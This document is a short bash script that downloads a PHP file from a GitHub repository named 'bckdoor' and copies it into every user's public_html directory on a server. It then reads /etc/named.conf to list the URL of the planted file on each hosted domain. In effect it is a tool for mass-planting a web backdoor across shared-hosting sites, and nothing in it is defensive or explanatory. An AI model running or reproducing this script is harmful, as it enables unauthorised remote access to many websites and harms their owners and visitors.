#!/bin/bash

# Prompt user to enter the filename
read -p "Enter the filename for the PHP file (e.g., bps.php): " file_to_upload

# Download file
wget "https://raw.githubusercontent.com/chuckyreply/bckdoor/refs/heads/main/inv.php" -O "$file_to_upload"

# Iterate through user directories in /home and upload file
for user_dir in /home/*/public_html; do
    if [ -d "$user_dir" ]; then
        # Upload file to public_html directory if exists
        cp "$file_to_upload" "$user_dir/"
        echo "File uploaded to $user_dir/"
    fi
done

# View contents of /etc/named.conf
echo "Contents of /etc/named.conf:"
while IFS= read -r line; do
    # Check if line contains /var/named/*.db
    if [[ "$line" =~ /var/named/([^\/]+)\.db ]]; then
        domain="${BASH_REMATCH[1]}"
        echo "https://$domain/$file_to_upload"
    fi
done < /etc/named.conf
